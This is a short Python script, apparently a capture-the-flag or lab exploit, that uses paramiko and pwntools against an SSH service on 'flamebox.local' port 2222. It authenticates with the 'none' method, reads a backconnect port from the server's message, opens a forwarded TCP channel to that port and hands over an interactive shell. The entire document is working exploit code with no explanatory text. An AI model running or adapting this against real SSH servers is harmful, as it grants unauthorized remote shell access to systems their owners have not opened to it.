import logging
import paramiko
from pwn import *

logging.basicConfig()
logging.getLogger("paramiko").setLevel(logging.WARNING)


t = paramiko.Transport(("flamebox.local", 2222))
t.start_client(timeout=5)
t.auth_none("hi")
chan = t.open_session()
backconnect_port = int(
    chan.recv(4096)
    .decode(errors="ignore")
    .split("on port ")[1]
    .split(" in 5 seconds.")[0]
)
chan.close()

chan = t.open_forwarded_tcpip_channel(("localhost", 8888), ("localhost", backconnect_port))
print(chan.recv(1024).decode())
t = tube()
t.recv_raw = chan.recv
t.send_raw = chan.send
t.recvuntil(b"$ ")
t.interactive()
t.close()
